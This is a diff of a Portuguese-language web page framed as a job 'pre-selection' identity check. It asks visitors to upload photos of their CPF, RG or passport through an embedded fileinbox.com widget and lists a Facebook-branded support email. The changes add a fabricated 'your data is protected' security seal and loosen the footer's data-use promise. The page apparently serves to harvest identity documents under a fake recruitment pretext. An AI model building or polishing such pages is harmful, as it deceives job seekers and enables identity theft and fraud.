@@ -3,7 +3,8 @@
 <head>
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <!-- área segura p/ notch -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <title>Pré-seleção – Confirmação de Identidade</title>
   <meta name="description" content="Página de pré-seleção: confirme sua identidade e avance para o formulário." />
   <meta name="theme-color" content="#0ea5e9" />
@@ -21,6 +22,7 @@
       --text:#0f172a; /* slate-900 */
       --muted:#475569; /* slate-600 */
       --ring:#93c5fd; /* blue-300 */
+      --radius:20px;
     }
     *{box-sizing:border-box}
     html,body{height:100%}
@@ -29,17 +31,19 @@
       font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,Ubuntu,"Noto Sans",sans-serif;
       color:var(--text);
       background:linear-gradient(160deg,var(--bg1),var(--bg2)) fixed;
-      /* >>> CORREÇÃO: alinhar no topo em vez de centralizar vertical <<< */
-      display:flex;               /* em vez de grid */
-      justify-content:center;     /* centraliza só na horizontal */
-      align-items:flex-start;     /* topo da página */
-      min-height:100svh;          /* usa viewport estável em mobile */
+      /* topo bem enquadrado + notch safe */
+      min-height:100svh;
+      display:flex;
+      justify-content:center;
+      align-items:flex-start;
       padding:clamp(12px,2vw,28px);
+      padding-top:calc(clamp(12px,2vw,28px) + env(safe-area-inset-top,0px));
+      padding-bottom:calc(clamp(12px,2vw,28px) + env(safe-area-inset-bottom,0px));
     }
     .card{
       width:min(100%, 980px);
       background:var(--card);
-      border-radius:20px;
+      border-radius:var(--radius);
       box-shadow:0 10px 30px rgba(2,6,23,.25);
       overflow:hidden;
       border:1px solid rgba(15,23,42,.06);
@@ -51,6 +55,7 @@
       background:linear-gradient(135deg, #38bdf8, #2563eb);
       color:white;
       padding:32px 28px 24px;
+      padding-top:calc(32px + env(safe-area-inset-top,0px)); /* garante respiro no topo */
     }
     .tag{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);padding:6px 10px;border-radius:999px;font-size:12px;letter-spacing:.2px}
     .title{margin:12px 0 6px;font-weight:800;line-height:1.1;font-size: clamp(22px, 4.5vw, 34px)}
@@ -58,16 +63,28 @@
 
     .content{padding:22px 22px 26px}
 
-    .section{border:1px solid rgba(15,23,42,.08);border-radius:14px;background:#f8fafc;padding:22px;box-shadow:0 6px 20px rgba(2,6,23,.10);margin-bottom:18px}
+    .section{
+      border:1px solid rgba(15,23,42,.08);
+      border-radius:14px;
+      background:#f8fafc;
+      padding:22px;
+      box-shadow:0 6px 20px rgba(2,6,23,.10);
+      margin-bottom:18px
+    }
     .section h3{margin:0 0 12px;font-size:18px}
 
     .radios{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px}
-    .radio{
-      display:flex;align-items:center;gap:10px;padding:12px;border:1px solid rgba(15,23,42,.10);border-radius:12px;background:#fff;cursor:pointer
-    }
+    .radio{display:flex;align-items:center;gap:10px;padding:12px;border:1px solid rgba(15,23,42,.10);border-radius:12px;background:#fff;cursor:pointer}
     .radio input{accent-color:#2563eb;width:18px;height:18px}
 
     .filebox{padding:14px;background:#fff;border:1px dashed rgba(15,23,42,.18);border-radius:12px}
+
+    .security{
+      display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:10px;
+      background:#fff;border:1px solid rgba(15,23,42,.08);border-radius:12px;padding:18px
+    }
+    .security svg{width:64px;height:64px}
+    .security p{margin:0;font-weight:700;color:#1d4ed8}
 
     .actions{display:flex;justify-content:flex-end}
     .btn{
@@ -78,7 +95,12 @@
 
     .error{color:#b91c1c;font-size:13px;margin-top:10px;display:none}
 
-    .footer{padding:16px 22px 24px;color:var(--muted);font-size:12px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+    .footer{
+      padding:16px 22px 24px;
+      color:var(--muted);
+      font-size:12px;
+      display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap
+    }
     .footer a{color:#2563eb;text-underline-offset:3px}
 
     @media (prefers-reduced-motion: reduce){*{animation:none !important;transition:none !important}}
@@ -88,7 +110,10 @@
   <main class="card" role="main" aria-labelledby="t">
     <header class="header">
       <span class="tag" aria-label="etiqueta">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M7 3h7l5 5v13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1Z" stroke="currentColor" stroke-width="1.6"/><path d="M14 3v4a1 1 0 0 0 1 1h4" stroke="currentColor" stroke-width="1.6"/></svg>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M7 3h7l5 5v13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1Z" stroke="currentColor" stroke-width="1.6"/>
+          <path d="M14 3v4a1 1 0 0 0 1 1h4" stroke="currentColor" stroke-width="1.6"/>
+        </svg>
         Verificação
       </span>
       <h1 class="title" id="t">Perfeito, agora confirme sua identidade</h1>
@@ -96,6 +121,7 @@
     </header>
 
     <section class="content">
+      <!-- Tipo de documento -->
       <div class="section" role="group" aria-labelledby="doclabel">
         <h3 id="doclabel">Tipo de documento</h3>
         <div class="radios">
@@ -103,16 +129,27 @@
           <label class="radio" for="doc_rg"><input id="doc_rg" name="doctype" type="radio" value="RG" /> RG</label>
           <label class="radio" for="doc_pass"><input id="doc_pass" name="doctype" type="radio" value="PASSAPORTE" /> Passaporte</label>
         </div>
-        <div id="err" class="error">Selecione um tipo de documento para continuar.</div>
+        <div id="err" class="error" role="alert">Selecione um tipo de documento para continuar.</div>
       </div>
 
-
-
+      <!-- Upload -->
       <div class="section">
         <h3>Envie as imagens do documento</h3>
         <div class="filebox">
+          <!-- EMBED Fileinbox -->
           <a href="https://fileinbox.com/enviodeinformacoes" class="fileinbox">Send files with fileinbox.com</a>
           <script type="text/javascript" src="https://fileinbox.com/embed.js"></script>
+        </div>
+      </div>
+
+      <!-- Selo de segurança (substitui 'melhor horário') -->
+      <div class="section">
+        <div class="security" aria-label="Selo de segurança de dados">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M12 2l7 3v6c0 5-3.5 9.5-7 11-3.5-1.5-7-6-7-11V5l7-3Z" stroke="#1d4ed8" stroke-width="1.6"/>
+            <path d="M8.5 12l2.5 2.5L15.5 10" stroke="#1d4ed8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <p>Seus dados estão protegidos com segurança</p>
         </div>
       </div>
 
@@ -122,7 +159,7 @@
     </section>
 
     <footer class="footer">
-      <span>🔒 Seus dados serão usados apenas para esta seleção.</span>
+      <span>🔒 Seus dados estão seguros.</span>
       <span>Suporte: <a href="mailto:trabalheconosco@facebook.com">trabalheconosco@facebook.com</a></span>
     </footer>
   </main>
@@ -146,11 +183,10 @@
         }
         try{
           const url = new URL(nextBase);
+          // repassa UTMs e adiciona doc_type
           const paramsHere = new URLSearchParams(window.location.search);
           paramsHere.forEach((v,k)=>{ if(!url.searchParams.has(k)) url.searchParams.set(k,v); });
           url.searchParams.set('doc_type', type);
-          const best = document.querySelector('input[name="besttime"]:checked');
-          if(best) url.searchParams.set('best_time', best.value);
           window.location.assign(url.toString()); // mesma aba
         }catch(e){
           window.location.assign(nextBase);
